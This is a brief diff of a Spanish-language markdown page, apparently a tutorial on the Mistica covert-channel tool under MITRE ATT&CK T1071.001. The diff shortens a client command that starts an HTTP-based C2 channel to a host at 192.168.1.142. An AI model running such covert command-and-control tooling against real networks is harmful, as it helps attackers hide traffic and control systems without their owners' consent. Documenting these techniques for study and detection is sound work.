@@ -55,7 +55,7 @@ Más información: [https://attack.mitre.org/techniques/T1071/001/](https://atta
 **Cliente**
 
 `
-python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80" -k key
+python.exe mc.py -m io:http -w "--hostname 192.168.1.142 --port 80" -k key
 `
 ![image094.png]({{site.baseurl}}/images/Mistica/image094.png)
 
